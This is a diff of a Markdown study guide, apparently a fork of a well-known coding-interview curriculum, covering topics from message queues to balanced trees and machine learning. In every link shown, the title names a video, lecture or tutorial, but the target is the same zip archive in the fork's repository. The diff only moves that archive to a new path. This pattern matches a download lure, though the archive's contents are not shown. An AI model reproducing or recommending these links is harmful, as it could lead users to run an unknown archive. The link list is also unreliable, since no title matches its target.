-        - [gRPC 101 for Java Developers (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Redis](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Tutorial](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Amazon SQS (queue)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Amazon SNS (pub-sub)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [RabbitMQ](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Get Started](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Celery](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [First Steps With Celery](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ZeroMQ](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Intro - Read The Manual](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [ActiveMQ](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Kafka](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MessagePack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Avro](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Thrift](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Tutorial](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Protocol Buffers](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Tutorials](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [gRPC](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [gRPC 101 for Java Developers (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Redis](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Tutorial](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Amazon SQS (queue)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Amazon SNS (pub-sub)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [RabbitMQ](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Get Started](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Celery](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [First Steps With Celery](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ZeroMQ](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Intro - Read The Manual](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [ActiveMQ](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Kafka](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MessagePack](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Avro](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### A*
-    - [A Search Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip*_search_algorithm)
-    - [A* Pathfinding Tutorial (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [A* Pathfinding (E01: algorithm explanation) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [A Search Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip*_search_algorithm)
+    - [A* Pathfinding Tutorial (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [A* Pathfinding (E01: algorithm explanation) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Fast Fourier Transform
-    - [An Interactive Guide To The Fourier Transform](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [What is a Fourier transform? What is it used for?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [What is the Fourier Transform? (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Divide & Conquer: FFT (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Understanding The FFT](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [An Interactive Guide To The Fourier Transform](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [What is a Fourier transform? What is it used for?](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [What is the Fourier Transform? (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Divide & Conquer: FFT (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Understanding The FFT](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Bloom Filter
     - Given a Bloom filter with m bits and k hashing functions, both insertion and membership testing are O(k)
-    - [Bloom Filters (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Bloom Filters | Mining of Massive Datasets | Stanford University (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Tutorial](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [How To Write A Bloom Filter App](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Bloom Filters (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Bloom Filters | Mining of Massive Datasets | Stanford University (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Tutorial](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [How To Write A Bloom Filter App](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### HyperLogLog
-    - [How To Count A Billion Distinct Objects Using Only 1.5KB Of Memory](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [How To Count A Billion Distinct Objects Using Only 1.5KB Of Memory](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Locality-Sensitive Hashing
     - Used to determine the similarity of documents
     - The opposite of MD5 or SHA which are used to determine if 2 documents/strings are exactly the same
-    - [Simhashing (hopefully) made simple](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Simhashing (hopefully) made simple](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### van Emde Boas Trees
-    - [Divide & Conquer: van Emde Boas Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [MIT Lecture Notes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Divide & Conquer: van Emde Boas Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [MIT Lecture Notes](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Augmented Data Structures
-    - [CS 61B Lecture 39: Augmenting Data Structures](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [CS 61B Lecture 39: Augmenting Data Structures](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Balanced search trees
     - Know at least one type of balanced binary tree (and know how it's implemented):
@@ -1666,7 +1666,7 @@ You're never really done.
         If you end up implementing red/black tree try just these:
         - Search and insertion functions, skipping delete
     - I want to learn more about B-Tree since it's used so widely with very large data sets
-    - [Self-balancing binary search tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Self-balancing binary search tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - **AVL trees**
         - In practice:
@@ -1675,20 +1675,20 @@ You're never really done.
             balanced than red–black trees, leading to slower insertion and removal but faster retrieval. This makes it
             attractive for data structures that may be built once and loaded without reconstruction, such as language
             dictionaries (or program dictionaries, such as the opcodes of an assembler or interpreter)
-        - [MIT AVL Trees / AVL Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [AVL Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [AVL Tree Implementation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Split And Merge](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [MIT AVL Trees / AVL Sort (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [AVL Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [AVL Tree Implementation (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Split And Merge](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - **Splay trees**
         - In practice:
             Splay trees are typically used in the implementation of caches, memory allocators, routers, garbage collectors,
             data compression, ropes (replacement of string used for long text strings), in Windows NT (in the virtual memory,
             networking and file system code) etc
-        - [CS 61B: Splay Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [CS 61B: Splay Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
         - MIT Lecture: Splay Trees:
             - Gets very mathy, but watch the last 10 minutes for sure.
-            - [Video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+            - [Video](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - **Red/black trees**
         - These are a translation of a 2-3 tree (see below).
@@ -1700,18 +1700,18 @@ You're never really done.
             the Completely Fair Scheduler used in current Linux kernels uses red–black trees. In the version 8 of Java,
             the Collection HashMap has been modified such that instead of using a LinkedList to store identical elements with poor
             hashcodes, a Red-Black tree is used
-        - [Aduni - Algorithms - Lecture 4 (link jumps to starting point) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Aduni - Algorithms - Lecture 5 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Red-Black Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip%E2%80%93black_tree)
-        - [An Introduction To Binary Search And Red Black Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [Aduni - Algorithms - Lecture 4 (link jumps to starting point) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Aduni - Algorithms - Lecture 5 (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Red-Black Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip%E2%80%93black_tree)
+        - [An Introduction To Binary Search And Red Black Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - **2-3 search trees**
         - In practice:
             2-3 trees have faster inserts at the expense of slower searches (since height is more compared to AVL trees).
         - You would use 2-3 tree very rarely because its implementation involves different types of nodes. Instead, people use Red Black trees.
-        - [23-Tree Intuition and Definition (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Binary View of 23-Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [2-3 Trees (student recitation) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [23-Tree Intuition and Definition (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Binary View of 23-Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [2-3 Trees (student recitation) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - **2-3-4 Trees (aka 2-4 trees)**
         - In practice:
@@ -1719,15 +1719,15 @@ You're never really done.
             operations on 2-4 trees are also equivalent to color-flipping and rotations in red–black trees. This makes 2-4 trees an
             important tool for understanding the logic behind red–black trees, and this is why many introductory algorithm texts introduce
             2-4 trees just before red–black trees, even though **2-4 trees are not often used in practice**.
-        - [CS 61B Lecture 26: Balanced Search Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Bottom Up 234-Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Top Down 234-Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [CS 61B Lecture 26: Balanced Search Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Bottom Up 234-Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Top Down 234-Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - **N-ary (K-ary, M-ary) trees**
         - note: the N or K is the branching factor (max branches)
         - binary trees are a 2-ary tree, with branching factor = 2
         - 2-3 trees are 3-ary
-        - [K-Ary Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [K-Ary Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
     - **B-Trees**
         - Fun fact: it's a mystery, but the B could stand for Boeing, Balanced, or Bayer (co-inventor).
@@ -1736,12 +1736,12 @@ You're never really done.
             its use in databases, the B-tree is also used in filesystems to allow quick random access to an arbitrary
             block in a particular file. The basic problem is turning the file block i address into a disk block
             (or perhaps to a cylinder-head-sector) address
-        - [B-Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [B-Tree Datastructure](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Introduction to B-Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [B-Tree Definition and Insertion (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [B-Tree Deletion (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [MIT 6.851 - Memory Hierarchy Models (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [B-Tree](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [B-Tree Datastructure](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Introduction to B-Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [B-Tree Definition and Insertion (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [B-Tree Deletion (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [MIT 6.851 - Memory Hierarchy Models (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
                 - covers cache-oblivious B-Trees, very interesting data structures
                 - the first 37 minutes are very technical, may be skipped (B is block size, cache line size)
 
@@ -1749,75 +1749,75 @@ You're never really done.
 - ### k-D Trees
     - Great for finding number of points in a rectangle or higher dimension object
     - A good fit for k-nearest neighbors
-    - [Kd Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [kNN K-d tree algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Kd Trees (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [kNN K-d tree algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Skip lists
     - "These are somewhat of a cult data structure" - Skiena
-    - [Randomization: Skip Lists (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [For animations and a little more detail](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Randomization: Skip Lists (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [For animations and a little more detail](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Network Flows
-    - [Ford-Fulkerson in 5 minutes — Step by step example (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Ford-Fulkerson Algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Network Flows (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Ford-Fulkerson in 5 minutes — Step by step example (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Ford-Fulkerson Algorithm (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Network Flows (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Disjoint Sets & Union Find
-    - [UCB 61B - Disjoint Sets; Sorting & selection (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Sedgewick Algorithms - Union-Find (6 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [UCB 61B - Disjoint Sets; Sorting & selection (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Sedgewick Algorithms - Union-Find (6 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Math for Fast Processing
-    - [Integer Arithmetic, Karatsuba Multiplication (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [The Chinese Remainder Theorem (used in cryptography) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Integer Arithmetic, Karatsuba Multiplication (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [The Chinese Remainder Theorem (used in cryptography) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Treap
     - Combination of a binary search tree and a heap
-    - [Treap](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Data Structures: Treaps explained (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Applications in set operations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Treap](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Data Structures: Treaps explained (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Applications in set operations](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip~https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Linear Programming (videos)
-    - [Linear Programming](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Finding minimum cost](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Finding maximum value](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Solve Linear Equations with Python - Simplex Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Linear Programming](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Finding minimum cost](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Finding maximum value](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Solve Linear Equations with Python - Simplex Algorithm](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Geometry, Convex hull (videos)
-    - [Graph Alg. IV: Intro to geometric algorithms - Lecture 9](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Geometric Algorithms: Graham & Jarvis - Lecture 10](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Divide & Conquer: Convex Hull, Median Finding](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Graph Alg. IV: Intro to geometric algorithms - Lecture 9](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Geometric Algorithms: Graham & Jarvis - Lecture 10](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Divide & Conquer: Convex Hull, Median Finding](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Discrete math
-    - [Computer Science 70, 001 - Spring 2015 - Discrete Mathematics and Probability Theory](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Discrete Mathematics by Shai Simonson (19 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Discrete Mathematics By IIT Ropar NPTEL](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+    - [Computer Science 70, 001 - Spring 2015 - Discrete Mathematics and Probability Theory](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Discrete Mathematics by Shai Simonson (19 videos)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Discrete Mathematics By IIT Ropar NPTEL](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
 
 - ### Machine Learning
     - Why ML?
-        - [How Google Is Remaking Itself As A Machine Learning First Company](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Large-Scale Deep Learning for Intelligent Computer Systems (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-        - [Deep Learning and Understandability versus Software Engineering and Verification by Peter Norvig](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Google's Cloud Machine learning tools (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Google Developers' Machine Learning Recipes (Scikit Learn & Tensorflow) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Tensorflow (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Tensorflow Tutorials](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
-    - [Practical Guide to implementing Neural Networks in Python (using Theano)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/extras/interview-coding-university-2.8.zip)
+        - [How Google Is Remaking Itself As A Machine Learning First Company](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Large-Scale Deep Learning for Intelligent Computer Systems (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+        - [Deep Learning and Understandability versus Software Engineering and Verification by Peter Norvig](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Google's Cloud Machine learning tools (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Google Developers' Machine Learning Recipes (Scikit Learn & Tensorflow) (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Tensorflow (video)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Tensorflow Tutorials](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
+    - [Practical Guide to implementing Neural Networks in Python (using Theano)](https://raw.githubusercontent.com/Dev-mohmmed/coding-interview-university/main/.github/coding-interview-university-v3.9.zip)
